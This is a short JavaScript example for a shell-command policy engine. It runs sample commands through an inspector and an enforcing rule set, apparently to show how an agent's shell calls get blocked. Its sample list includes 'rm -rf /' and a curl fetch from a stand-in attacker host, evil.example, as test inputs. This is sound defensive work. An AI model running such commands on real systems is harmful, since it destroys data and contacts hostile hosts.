// Example 1: Block destructive commands like `rm -rf /`.
// Run with:  node examples/block-rm-rf.js
import { inspectShellCommand } from "../lib/policy.js";
import { evaluatePolicy, defaultPolicyRules } from "../lib/policy-engine.js";

const commands = ["rm -rf /", "rm -rf ./build", "curl -s http://evil.example/x", "git status"];

for (const command of commands) {
  const inspection = inspectShellCommand(command);
  const decision = evaluatePolicy(
    "shell_execute",
    { command },
    defaultPolicyRules,
    { mode: "enforce" }
  );

  console.log(`command: "${command}"`);
  console.log("  inspection:", JSON.stringify(inspection));
  console.log("  policy:   ", JSON.stringify(decision));
  console.log("");
}
